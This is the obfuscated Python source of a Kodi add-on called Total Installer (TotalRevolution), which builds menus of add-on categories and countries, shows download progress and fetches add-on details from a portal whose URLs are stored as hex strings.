# If anybody wants to use this code THEY MUST abide by the GPL 
# DO NOT remove the license as that is unlawful and I will expect
# the original author (whufclee) to be credited in the description
# Thank you.

import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon , os , sys , time , binascii , xbmcvfs , glob , shutil , subprocess , datetime , threading , zipfile , ntpath
import yt , downloader
try :
 from sqlite3 import dbapi2 as database
except :
 from pysqlite2 import dbapi2 as database
from addon . common . addon import Addon
from addon . common . net import Net
if 64 - 64: i11iIiiIii
OO0o = xbmcaddon . Addon ( id = 'plugin.program.totalinstaller' )
Oo0Ooo = 'plugin.program.totalinstaller'
O0O0OO0O0O0 = "[COLOR=blue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution"
zip = OO0o . getSetting ( 'zip' )
iiiii = OO0o . getSetting ( 'localcopy' )
ooo0OO = OO0o . getSetting ( 'private' )
II1 = OO0o . getSetting ( 'reseller' )
O00ooooo00 = OO0o . getSetting ( 'openelec' )
I1IiiI = OO0o . getSetting ( 'resellername' )
IIi1IiiiI1Ii = OO0o . getSetting ( 'resellerid' )
I11i11Ii = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f6172742f'
oO00oOo = OO0o . getSetting ( 'mastercopy' )
OOOo0 = OO0o . getSetting ( 'username' )
Oooo000o = OO0o . getSetting ( 'password' )
IiIi11iIIi1Ii = OO0o . getSetting ( 'login' )
Oo0O = OO0o . getSetting ( 'trcheck' )
IiI = xbmcgui . Dialog ( )
ooOo = xbmcgui . DialogProgress ( )
Oo = xbmc . translatePath ( 'special://home/' )
o0O = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
IiiIII111iI = xbmc . translatePath ( os . path . join ( 'special://home/media' , '' ) )
IiII = xbmc . translatePath ( os . path . join ( o0O , 'autoexec.py' ) )
iI1Ii11111iIi = xbmc . translatePath ( os . path . join ( o0O , 'autoexec_bak.py' ) )
i1i1II = xbmc . translatePath ( os . path . join ( o0O , 'addon_data' ) )
O0oo0OO0 = xbmc . translatePath ( os . path . join ( o0O , 'playlists' ) )
I1i1iiI1 = xbmc . translatePath ( os . path . join ( o0O , 'Database' ) )
iiIIIII1i1iI = xbmc . translatePath ( os . path . join ( o0O , 'Thumbnails' ) )
o0oO0 = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' , '' ) )
oo00 = xbmc . translatePath ( os . path . join ( o0oO0 , Oo0Ooo , 'default.py' ) )
o00 = xbmc . translatePath ( os . path . join ( o0oO0 , Oo0Ooo , 'fanart.jpg' ) )
Oo0oO0ooo = os . path . join ( o0O , 'guisettings.xml' )
o0oOoO00o = xbmc . translatePath ( os . path . join ( o0O , 'guisettings.xml' ) )
i1 = xbmc . translatePath ( os . path . join ( o0O , 'guifix.xml' ) )
oOOoo00O0O = xbmc . translatePath ( os . path . join ( o0O , 'install.xml' ) )
i1111 = binascii . unhexlify ( I11i11Ii ) + os . sep
i11 = xbmc . translatePath ( os . path . join ( o0O , 'favourites.xml' ) )
I11 = xbmc . translatePath ( os . path . join ( o0O , 'sources.xml' ) )
Oo0o0000o0o0 = xbmc . translatePath ( os . path . join ( o0O , 'advancedsettings.xml' ) )
oOo0oooo00o = xbmc . translatePath ( os . path . join ( o0O , 'profiles.xml' ) )
oO0o0o0ooO0oO = xbmc . translatePath ( os . path . join ( o0O , 'RssFeeds.xml' ) )
oo0o0O00 = xbmc . translatePath ( os . path . join ( o0O , 'keymaps' , 'keyboard.xml' ) )
oO = xbmc . translatePath ( os . path . join ( zip ) )
i1iiIIiiI111 = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , '' ) )
oooOOOOO = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'cookiejar' ) )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'startup.xml' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'temp.xml' ) )
ii11iIi1I = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'id.xml' ) )
iI111I11I1I1 = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo , 'idtemp.xml' ) )
OOooO0OOoo = xbmc . translatePath ( os . path . join ( o0oO0 , Oo0Ooo , 'resources/' ) )
iIii1 = xbmc . getSkinDir ( )
oOOoO0 = xbmc . translatePath ( 'special://logpath/' )
O0OoO000O0OO = Net ( )
iiI1IiI = xbmc . translatePath ( os . path . join ( i1i1II , Oo0Ooo ) )
II = xbmc . translatePath ( os . path . join ( iiI1IiI , 'guinew.xml' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( iiI1IiI , 'guitemp' , '' ) )
OooO0 = xbmc . translatePath ( os . path . join ( oO , 'Database' ) )
II11iiii1Ii = xbmc . translatePath ( os . path . join ( 'special://' , 'home/addons' ) )
OO0oOoo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
O0o0Oo = 'None'
Oo00OOOOO = 0.0
O0O = 0.0
if 83 - 83: O0OOO + Ii1iIIIi1ii % Iii1i1I11I % o0oO + I1i1iii
#-----------------------------------------------------------------------------------------------------------------    
#Popup class - thanks to whoever codes the help popup in TVAddons Maintenance for this section. Unfortunately there doesn't appear to be any author details in that code so unable to credit by name.
class i1iiI11I ( xbmcgui . WindowXMLDialog ) :
 def __init__ ( self , * args , ** kwargs ) : self . shut = kwargs [ 'close_time' ] ; xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" ) ; xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
 def onFocus ( self , controlID ) : pass
 def onClick ( self , controlID ) :
  if controlID == 12 : xbmc . Player ( ) . stop ( ) ; self . _close_dialog ( )
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] : xbmc . Player ( ) . stop ( ) ; self . _close_dialog ( )
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" ) ; time . sleep ( .4 ) ; self . close ( )
  if 29 - 29: iiIi
def Oo0O0OOOoo ( numblocks , blocksize , filesize , dp , start_time ) :
 if 95 - 95: iiiIi1i1I % II11iII % OoOo
 global Oo00OOOOO
 global O0O
 if 18 - 18: iii11I111
 try :
  OOOO00ooo0Ooo = min ( numblocks * blocksize * 100 / filesize , 100 )
  O0O = float ( numblocks ) * blocksize
  OOOooOooo00O0 = O0O / ( 1024 * 1024 )
  Oo0OO = O0O / ( time . time ( ) - start_time )
  if Oo0OO > 0 :
   oOOoOo00o = ( filesize - numblocks * blocksize ) / Oo0OO
   if Oo0OO > Oo00OOOOO : Oo00OOOOO = Oo0OO
  else :
   oOOoOo00o = 0
  o0OOoo0OO0OOO = Oo0OO * 8 / 1024
  iI1iI1I1i1I = o0OOoo0OO0OOO / 1024
  iIi11Ii1 = float ( filesize ) / ( 1024 * 1024 )
  Ii11iII1 = '%.02f MB of %.02f MB' % ( OOOooOooo00O0 , iIi11Ii1 )
  Oo0O0O0ooO0O = 'Speed: %.02f Mb/s ' % iI1iI1I1i1I
  Oo0O0O0ooO0O += 'ETA: %02d:%02d' % divmod ( oOOoOo00o , 60 )
  dp . update ( OOOO00ooo0Ooo , Ii11iII1 , Oo0O0O0ooO0O )
 except :
  O0O = float ( filesize )
  OOOO00ooo0Ooo = 100
  dp . update ( OOOO00ooo0Ooo )
 if dp . iscanceled ( ) :
  dp . close ( )
  raise Exception ( "Cancelled" )
  if 15 - 15: Ooo0Oo0 + OOO00OoOO00 . oOOoO0O0O0 + Oo000o
  if 7 - 7: OoO0O00 * ooOO0o . O0oO . i1OOO
def Oo0oOOo ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 Oo0OoO00oOO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description ) + "&skins=" + urllib . quote_plus ( skins ) + "&guisettingslink=" + urllib . quote_plus ( guisettingslink ) + "&artpack=" + urllib . quote_plus ( artpack )
 OOO00O = True
 OOoOO0oo0ooO = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 OOoOO0oo0ooO . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 OOoOO0oo0ooO . setProperty ( "Fanart_Image" , fanart )
 OOoOO0oo0ooO . setProperty ( "Build.Video" , video )
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( url == None ) or ( len ( url ) < 1 ) :
  OOO00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = True )
 else :
  OOO00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = False )
 return OOO00O
 if 98 - 98: oO00Oo0o000 * oO00Oo0o000 * iiiIi1i1I % OoO0O00
 if 2 - 2: oOOoO0O0O0 + Ooo0Oo0 % i1OOO % Ii1iIIIi1ii
def iI1ii11iIi1i ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 50 - 50: O0oO
 if 14 - 14: Oo000o % II11iII * Oo000o
def iII ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 iconimage = i1111 + iconimage
 Oo0OoO00oOO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&author=" + urllib . quote_plus ( author ) + "&description=" + urllib . quote_plus ( description ) + "&version=" + urllib . quote_plus ( version ) + "&buildname=" + urllib . quote_plus ( buildname ) + "&updated=" + urllib . quote_plus ( updated ) + "&skins=" + urllib . quote_plus ( skins ) + "&videoaddons=" + urllib . quote_plus ( videoaddons ) + "&audioaddons=" + urllib . quote_plus ( audioaddons ) + "&buildname=" + urllib . quote_plus ( buildname ) + "&programaddons=" + urllib . quote_plus ( programaddons ) + "&pictureaddons=" + urllib . quote_plus ( pictureaddons ) + "&sources=" + urllib . quote_plus ( sources ) + "&adult=" + urllib . quote_plus ( adult )
 OOO00O = True
 OOoOO0oo0ooO = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 OOoOO0oo0ooO . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 OOoOO0oo0ooO . setProperty ( "Fanart_Image" , fanart )
 OOoOO0oo0ooO . setProperty ( "Build.Video" , oO00o0 )
 OOO00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = False )
 return OOO00O
 if 55 - 55: iiiIi1i1I + Ii1iIIIi1ii / OoOo * OOO00OoOO00 - i11iIiiIii - OoO0O00
def ii1ii1ii ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  iconimage = i1111 + iconimage
 else :
  iconimage = 'DefaultFolder.png'
 if fanart == '' :
  fanart = o00
 Oo0OoO00oOO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&zip_link=" + urllib . quote_plus ( zip_link ) + "&repo_link=" + urllib . quote_plus ( repo_link ) + "&data_path=" + urllib . quote_plus ( data_path ) + "&provider_name=" + str ( provider_name ) + "&forum=" + str ( forum ) + "&repo_id=" + str ( repo_id ) + "&addon_id=" + str ( addon_id ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description )
 OOO00O = True
 OOoOO0oo0ooO = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 OOoOO0oo0ooO . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 OOoOO0oo0ooO . setProperty ( "Fanart_Image" , fanart )
 OOoOO0oo0ooO . setProperty ( "Build.Video" , video )
 iI1ii11iIi1i ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = False )
 if 91 - 91: O0oO
 if 15 - 15: I1i1iii
def Ii ( type , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' ) :
 if type != 'folder2' and type != 'addon' :
  if len ( iconimage ) > 0 :
   iconimage = i1111 + iconimage
  else :
   iconimage = 'DefaultFolder.png'
 if type == 'addon' :
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   ooo0O = '687474703a2f2f746f74616c78626d632e74762f6164646f6e732f63616368652f696d616765732f3463373933313938383765323430373839636131323566313434643938395f6164646f6e2d64756d6d792e706e67'
   iconimage = binascii . unhexlify ( ooo0O )
 if fanart == '' :
  fanart = o00
 Oo0OoO00oOO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&video=" + urllib . quote_plus ( video ) + "&description=" + urllib . quote_plus ( description )
 OOO00O = True
 OOoOO0oo0ooO = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 OOoOO0oo0ooO . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 OOoOO0oo0ooO . setProperty ( "Fanart_Image" , fanart )
 OOoOO0oo0ooO . setProperty ( "Build.Video" , video )
 if ( type == 'folder' ) or ( type == 'folder2' ) or ( type == 'tutorial_folder' ) or ( type == 'news_folder' ) :
  OOO00O = iI1ii11iIi1i ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = True )
 else :
  OOO00O = iI1ii11iIi1i ( handle = int ( sys . argv [ 1 ] ) , url = Oo0OoO00oOO0o , listitem = OOoOO0oo0ooO , isFolder = False )
 return OOO00O
 if 75 - 75: iii11I111 % iii11I111 . i1OOO
 if 5 - 5: iii11I111 * oO00Oo0o000 + OoOo . oOOoO0O0O0 + OoOo
def oOiIi1IIIi1 ( ) :
 Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Audio' , '&typex=audio' , 'grab_addons' , 'audio.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Image (Picture)' , '&typex=image' , 'grab_addons' , 'pictures.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Program' , '&typex=program' , 'grab_addons' , 'programs.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Video' , '&typex=video' , 'grab_addons' , 'video.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , '&typex=movie%20scraper' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , '&typex=tv%20show%20scraper' , 'grab_addons' , 'tvshows.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , '&typex=artist%20scraper' , 'grab_addons' , 'artists.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , '&typex=music%20video%20scraper' , 'grab_addons' , 'musicvideos.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , '&typex=service' , 'grab_addons' , 'services.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , '&typex=weather' , 'grab_addons' , 'weather.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Repositories' , '&typex=repository' , 'grab_addons' , 'repositories.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Scripts (Program Add-ons)' , '&typex=executable' , 'grab_addons' , 'scripts.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Screensavers' , '&typex=screensaver' , 'grab_addons' , 'screensaver.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Script Modules' , '&typex=script%20module' , 'grab_addons' , 'scriptmodules.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Skins' , '&typex=skin' , 'grab_addons' , 'skins.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Subtitles' , '&typex=subtitles' , 'grab_addons' , 'subtitles.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Web Interface' , '&typex=web%20interface' , 'grab_addons' , 'webinterface.png' , '' , '' , '' )
 if 86 - 86: Oo000o % OoOo / iiIi / OoOo
 if 42 - 42: II11iII
 if 67 - 67: i1OOO . ooOO0o . O0OOO
def IIIIiiII111 ( ) :
 Ii ( 'folder' , 'African' , '&genre=african' , 'grab_addons' , 'african.png' , '' , '' , '' )
 Ii ( 'folder' , 'Arabic' , '&genre=arabic' , 'grab_addons' , 'arabic.png' , '' , '' , '' )
 Ii ( 'folder' , 'Asian' , '&genre=asian' , 'grab_addons' , 'asian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Australian' , '&genre=australian' , 'grab_addons' , 'australian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Austrian' , '&genre=austrian' , 'grab_addons' , 'austrian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Belgian' , '&genre=belgian' , 'grab_addons' , 'belgian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Brazilian' , '&genre=brazilian' , 'grab_addons' , 'brazilian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Canadian' , '&genre=canadian' , 'grab_addons' , 'canadian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Columbian' , '&genre=columbian' , 'grab_addons' , 'columbian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Czech' , '&genre=czech' , 'grab_addons' , 'czech.png' , '' , '' , '' )
 Ii ( 'folder' , 'Danish' , '&genre=danish' , 'grab_addons' , 'danish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Dominican' , '&genre=dominican' , 'grab_addons' , 'dominican.png' , '' , '' , '' )
 Ii ( 'folder' , 'Dutch' , '&genre=dutch' , 'grab_addons' , 'dutch.png' , '' , '' , '' )
 Ii ( 'folder' , 'Egyptian' , '&genre=egyptian' , 'grab_addons' , 'egyptian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Filipino' , '&genre=filipino' , 'grab_addons' , 'filipino.png' , '' , '' , '' )
 Ii ( 'folder' , 'Finnish' , '&genre=finnish' , 'grab_addons' , 'finnish.png' , '' , '' , '' )
 Ii ( 'folder' , 'French' , '&genre=french' , 'grab_addons' , 'french.png' , '' , '' , '' )
 Ii ( 'folder' , 'German' , '&genre=german' , 'grab_addons' , 'german.png' , '' , '' , '' )
 Ii ( 'folder' , 'Greek' , '&genre=greek' , 'grab_addons' , 'greek.png' , '' , '' , '' )
 Ii ( 'folder' , 'Hebrew' , '&genre=hebrew' , 'grab_addons' , 'hebrew.png' , '' , '' , '' )
 Ii ( 'folder' , 'Hungarian' , '&genre=hungarian' , 'grab_addons' , 'hungarian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Icelandic' , '&genre=icelandic' , 'grab_addons' , 'icelandic.png' , '' , '' , '' )
 Ii ( 'folder' , 'Indian' , '&genre=indian' , 'grab_addons' , 'indian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Irish' , '&genre=irish' , 'grab_addons' , 'irish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Italian' , '&genre=italian' , 'grab_addons' , 'italian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Japanese' , '&genre=japanese' , 'grab_addons' , 'japanese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Korean' , '&genre=korean' , 'grab_addons' , 'korean.png' , '' , '' , '' )
 Ii ( 'folder' , 'Lebanese' , '&genre=lebanese' , 'grab_addons' , 'lebanese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Mongolian' , '&genre=mongolian' , 'grab_addons' , 'mongolian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Nepali' , '&genre=nepali' , 'grab_addons' , 'nepali.png' , '' , '' , '' )
 Ii ( 'folder' , 'New Zealand' , '&genre=newzealand' , 'grab_addons' , 'newzealand.png' , '' , '' , '' )
 Ii ( 'folder' , 'Norwegian' , '&genre=norwegian' , 'grab_addons' , 'norwegian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Pakistani' , '&genre=pakistani' , 'grab_addons' , 'pakistani.png' , '' , '' , '' )
 Ii ( 'folder' , 'Polish' , '&genre=polish' , 'grab_addons' , 'polish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Portuguese' , '&genre=portuguese' , 'grab_addons' , 'portuguese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Romanian' , '&genre=romanian' , 'grab_addons' , 'romanian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Russian' , '&genre=russian' , 'grab_addons' , 'russian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Singapore' , '&genre=singapore' , 'grab_addons' , 'singapore.png' , '' , '' , '' )
 Ii ( 'folder' , 'Spanish' , '&genre=spanish' , 'grab_addons' , 'spanish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Swedish' , '&genre=swedish' , 'grab_addons' , 'swedish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Swiss' , '&genre=swiss' , 'grab_addons' , 'swiss.png' , '' , '' , '' )
 Ii ( 'folder' , 'Syrian' , '&genre=syrian' , 'grab_addons' , 'syrian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Tamil' , '&genre=tamil' , 'grab_addons' , 'tamil.png' , '' , '' , '' )
 Ii ( 'folder' , 'Thai' , '&genre=thai' , 'grab_addons' , 'thai.png' , '' , '' , '' )
 Ii ( 'folder' , 'Turkish' , '&genre=turkish' , 'grab_addons' , 'turkish.png' , '' , '' , '' )
 Ii ( 'folder' , 'UK' , '&genre=uk' , 'grab_addons' , 'uk.png' , '' , '' , '' )
 Ii ( 'folder' , 'USA' , '&genre=usa' , 'grab_addons' , 'usa.png' , '' , '' , '' )
 Ii ( 'folder' , 'Vietnamese' , '&genre=vietnamese' , 'grab_addons' , 'vietnamese.png' , '' , '' , '' )
 if 97 - 97: Ooo0Oo0 + oOOoO0O0O0 / Ii1iIIIi1ii / ooOO0o
 if 37 - 37: ooOO0o - oO00Oo0o000 * OOO00OoOO00 % i11iIiiIii - i1OOO
def o0oOIIiIi1iI ( url ) :
 i1IiiiI1iI = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f6164646f6e64657461696c732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( i1IiiiI1iI ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 i1II1Iiii1I11 = re . compile ( 'UID="(.+?)"' ) . findall ( ooOOoooooo )
 IIII = re . compile ( 'id="(.+?)"' ) . findall ( ooOOoooooo )
 iiIiI = re . compile ( 'provider_name="(.+?)"' ) . findall ( ooOOoooooo )
 o00oooO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
 o0O0OOO0Ooo = re . compile ( 'created="(.+?)"' ) . findall ( ooOOoooooo )
 iiIiII1 = re . compile ( 'addon_types="(.+?)"' ) . findall ( ooOOoooooo )
 OOO00O0O = re . compile ( 'updated="(.+?)"' ) . findall ( ooOOoooooo )
 iii = re . compile ( 'downloads="(.+?)"' ) . findall ( ooOOoooooo )
 if 90 - 90: iii11I111 % o0oO / II11iII
 IIi = re . compile ( 'description="(.+?)"' ) . findall ( ooOOoooooo )
 i1Iii1i1I = re . compile ( 'devbroke="(.+?)"' ) . findall ( ooOOoooooo )
 OOoO00 = re . compile ( 'broken="(.+?)"' ) . findall ( ooOOoooooo )
 IiI111111IIII = re . compile ( 'deleted="(.+?)"' ) . findall ( ooOOoooooo )
 i1Ii = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( ooOOoooooo )
 if 14 - 14: ooOO0o
 I1iI1iIi111i = re . compile ( 'repo_url="(.+?)"' ) . findall ( ooOOoooooo )
 iiIi1IIi1I = re . compile ( 'data_url="(.+?)"' ) . findall ( ooOOoooooo )
 o0OoOO000ooO0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( ooOOoooooo )
 o0o0o0oO0oOO = re . compile ( 'genres="(.+?)"' ) . findall ( ooOOoooooo )
 ii1Ii11I = re . compile ( 'forum="(.+?)"' ) . findall ( ooOOoooooo )
 o00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( ooOOoooooo )
 ii = re . compile ( 'license="(.+?)"' ) . findall ( ooOOoooooo )
 OOooooO0Oo = re . compile ( 'platform="(.+?)"' ) . findall ( ooOOoooooo )
 OO = re . compile ( 'visible="(.+?)"' ) . findall ( ooOOoooooo )
 iIiIIi1 = re . compile ( 'script="(.+?)"' ) . findall ( ooOOoooooo )
 I1IIII1i = re . compile ( 'program_plugin="(.+?)"' ) . findall ( ooOOoooooo )
 I1I11i = re . compile ( 'script_module="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1I1I1i1Ii = re . compile ( 'video_plugin="(.+?)"' ) . findall ( ooOOoooooo )
 i1Oo0oO00o = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( ooOOoooooo )
 i11I1II1I11i = re . compile ( 'image_plugin="(.+?)"' ) . findall ( ooOOoooooo )
 OooOoOO0 = re . compile ( 'repository="(.+?)"' ) . findall ( ooOOoooooo )
 iI1i11iII111 = re . compile ( 'weather_service="(.+?)"' ) . findall ( ooOOoooooo )
 Iii1IIII11I = re . compile ( 'skin="(.+?)"' ) . findall ( ooOOoooooo )
 OOOoo0OO = re . compile ( 'service="(.+?)"' ) . findall ( ooOOoooooo )
 oO0o0 = re . compile ( 'warning="(.+?)"' ) . findall ( ooOOoooooo )
 iI1Ii11iIiI1 = re . compile ( 'web_interface="(.+?)"' ) . findall ( ooOOoooooo )
 OO0Oooo0oOO0O = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( ooOOoooooo )
 o00O0 = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( ooOOoooooo )
 oOO0O00Oo0O0o = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( ooOOoooooo )
 ii1 = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( ooOOoooooo )
 I1iIIiiIIi1i = re . compile ( 'subtitles="(.+?)"' ) . findall ( ooOOoooooo )
 O0O0ooOOO = re . compile ( 'requires="(.+?)"' ) . findall ( ooOOoooooo )
 oOOo0O00o = re . compile ( 'modules="(.+?)"' ) . findall ( ooOOoooooo )
 iIiIi11 = re . compile ( 'icon="(.+?)"' ) . findall ( ooOOoooooo )
 OOO = re . compile ( 'video_preview="(.+?)"' ) . findall ( ooOOoooooo )
 iiiiI = re . compile ( 'video_guide="(.+?)"' ) . findall ( ooOOoooooo )
 oooOo0OOOoo0 = re . compile ( 'video_guide1="(.+?)"' ) . findall ( ooOOoooooo )
 OOoO = re . compile ( 'video_guide2="(.+?)"' ) . findall ( ooOOoooooo )
 OO0O000 = re . compile ( 'video_guide3="(.+?)"' ) . findall ( ooOOoooooo )
 iiIiI1i1 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( ooOOoooooo )
 oO0O00oOOoooO = re . compile ( 'video_guide5="(.+?)"' ) . findall ( ooOOoooooo )
 IiIi11iI = re . compile ( 'video_guide6="(.+?)"' ) . findall ( ooOOoooooo )
 Oo0O00O000 = re . compile ( 'video_guide7="(.+?)"' ) . findall ( ooOOoooooo )
 i11I1IiII1i1i = re . compile ( 'video_guide8="(.+?)"' ) . findall ( ooOOoooooo )
 oo = re . compile ( 'video_guide9="(.+?)"' ) . findall ( ooOOoooooo )
 I1111i = re . compile ( 'video_guide10="(.+?)"' ) . findall ( ooOOoooooo )
 iIIii = re . compile ( 'video_label1="(.+?)"' ) . findall ( ooOOoooooo )
 o00O0O = re . compile ( 'video_label2="(.+?)"' ) . findall ( ooOOoooooo )
 ii1iii1i = re . compile ( 'video_label3="(.+?)"' ) . findall ( ooOOoooooo )
 Iii1I1111ii = re . compile ( 'video_label4="(.+?)"' ) . findall ( ooOOoooooo )
 ooOoO00 = re . compile ( 'video_label5="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1IIiI1i = re . compile ( 'video_label6="(.+?)"' ) . findall ( ooOOoooooo )
